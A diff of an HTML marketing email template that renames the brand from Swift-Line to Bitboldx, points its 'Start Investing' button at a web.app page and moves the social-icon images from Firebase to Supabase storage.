       <td align="center" valign="top" style="padding:0;Margin:0;width:560px">
        <table cellpadding="0" cellspacing="0" width="100%" style="mso-table-lspace:0pt;mso-table-rspace:0pt;border-collapse:separate;border-spacing:0px;border-radius:5px" role="presentation">
        <tr>
-       <td align="center" class="es-m-p25t" style="padding:0;Margin:0;padding-top:15px;padding-bottom:5px"><span class="es-button-border" style="border-style:solid;border-color:#2CB543;background:#45818e;border-width:0px;display:inline-block;border-radius:5px;width:auto"><a href="" class="es-button" target="_blank" style="mso-style-priority:100 !important;text-decoration:none !important;mso-line-height-rule:exactly;color:#FFFFFF;font-size:20px;padding:10px 30px 10px 30px;display:inline-block;background:#45818e;border-radius:5px;font-family:arial, 'helvetica neue', helvetica, sans-serif;font-weight:normal;font-style:normal;line-height:24px;width:auto;text-align:center;letter-spacing:0;mso-padding-alt:0;mso-border-alt:10px solid #45818e">Start Investing</a></span></td>
+       <td align="center" class="es-m-p25t" style="padding:0;Margin:0;padding-top:15px;padding-bottom:5px"><span class="es-button-border" style="border-style:solid;border-color:#2CB543;background:#45818e;border-width:0px;display:inline-block;border-radius:5px;width:auto"><a href="" class="es-button" target="_blank" style="mso-style-priority:100 !important;text-decoration:none !important;mso-line-height-rule:exactly;color:#FFFFFF;font-size:20px;padding:10px 30px 10px 30px;display:inline-block;background:#45818e;border-radius:5px;font-family:arial, 'helvetica neue', helvetica, sans-serif;font-weight:normal;font-style:normal;line-height:24px;width:auto;text-align:center;letter-spacing:0;mso-padding-alt:0;mso-border-alt:10px solid #45818e" href="https://bit-bx.web.app/index.html">Start Investing</a></span></td>
       </tr>
        </table></td>
      </tr>
@@ -2455,15 +2455,15 @@ color:#ffffff!important;
           <td align="center" style="padding:0;Margin:0;padding-top:15px;padding-bottom:15px;font-size:0">
            <table cellpadding="0" cellspacing="0" class="es-table-not-adapt es-social" role="presentation" style="mso-table-lspace:0pt;mso-table-rspace:0pt;border-collapse:collapse;border-spacing:0px">
              <tr>
-              <td align="center" valign="top" style="padding:0;Margin:0;padding-right:40px"><img title="Facebook" src="https://firebasestorage.googleapis.com/v0/b/stockeliteoptions.appspot.com/o/facebook-logo-black.png?alt=media&token=44fa4029-7b22-4ed2-83d7-9e0b3586c824" alt="Fb" width="32" height="32" style="display:block;font-size:14px;border:0;outline:none;text-decoration:none"></td>
-              <td align="center" valign="top" style="padding:0;Margin:0;padding-right:40px"><img title="X.com" src="https://firebasestorage.googleapis.com/v0/b/stockeliteoptions.appspot.com/o/x-logo-black.png?alt=media&token=4fbcaa0d-1d46-4fef-b1c8-2a40eea9f06a" alt="X" width="32" height="32" style="display:block;font-size:14px;border:0;outline:none;text-decoration:none"></td>
-              <td align="center" valign="top" style="padding:0;Margin:0;padding-right:40px"><img title="Instagram" src="https://firebasestorage.googleapis.com/v0/b/stockeliteoptions.appspot.com/o/instagram-logo-black.png?alt=media&token=23b8c2a7-ddb3-4478-b400-0cdd12e5693a" alt="Inst" width="32" height="32" style="display:block;font-size:14px;border:0;outline:none;text-decoration:none"></td>
-              <td align="center" valign="top" style="padding:0;Margin:0"><img title="Youtube" src="https://firebasestorage.googleapis.com/v0/b/stockeliteoptions.appspot.com/o/youtube-logo-black.png?alt=media&token=eff310fc-3a9d-499a-9f87-aaf0f53aee2a" alt="Yt" width="32" height="32" style="display:block;font-size:14px;border:0;outline:none;text-decoration:none"></td>
+              <td align="center" valign="top" style="padding:0;Margin:0;padding-right:40px"><img title="Facebook" src="https://fpwncdgdqbhrkabqbisz.supabase.co/storage/v1/object/public/mailimage//facebook-logo-black.png" alt="Fb" width="32" height="32" style="display:block;font-size:14px;border:0;outline:none;text-decoration:none"></td>
+              <td align="center" valign="top" style="padding:0;Margin:0;padding-right:40px"><img title="X.com" src="https://fpwncdgdqbhrkabqbisz.supabase.co/storage/v1/object/public/mailimage//x-logo-black.png" alt="X" width="32" height="32" style="display:block;font-size:14px;border:0;outline:none;text-decoration:none"></td>
+              <td align="center" valign="top" style="padding:0;Margin:0;padding-right:40px"><img title="Instagram" src="https://fpwncdgdqbhrkabqbisz.supabase.co/storage/v1/object/public/mailimage//instagram-logo-black.png" alt="Inst" width="32" height="32" style="display:block;font-size:14px;border:0;outline:none;text-decoration:none"></td>
+              <td align="center" valign="top" style="padding:0;Margin:0"><img title="Youtube" src="https://fpwncdgdqbhrkabqbisz.supabase.co/storage/v1/object/public/mailimage//youtube-logo-black.png" alt="Yt" width="32" height="32" style="display:block;font-size:14px;border:0;outline:none;text-decoration:none"></td>
              </tr>
            </table></td>
          </tr>
          <tr>
-          <td align="center" style="padding:0;Margin:0;padding-bottom:35px"><p align="center" style="Margin:0;mso-line-height-rule:exactly;font-family:arial, 'helvetica neue', helvetica, sans-serif;line-height:18px;letter-spacing:0;color:#333333;font-size:12px">Swift-Line © 2024 All Rights Reserved.</p><p style="Margin:0;mso-line-height-rule:exactly;font-family:arial, 'helvetica neue', helvetica, sans-serif;line-height:18px;letter-spacing:0;color:#333333;font-size:12px">&nbsp;506 Howard Street, Suite 4200, San Francisco, CA, 94105, United States</p></td>
+          <td align="center" style="padding:0;Margin:0;padding-bottom:35px"><p align="center" style="Margin:0;mso-line-height-rule:exactly;font-family:arial, 'helvetica neue', helvetica, sans-serif;line-height:18px;letter-spacing:0;color:#333333;font-size:12px">Bitboldx © 2024 All Rights Reserved.</p><p style="Margin:0;mso-line-height-rule:exactly;font-family:arial, 'helvetica neue', helvetica, sans-serif;line-height:18px;letter-spacing:0;color:#333333;font-size:12px">&nbsp;506 Howard Street, Suite 4200, San Francisco, CA, 94105, United States</p></td>
          </tr>
          <tr>
           <td style="padding:0;Margin:0">
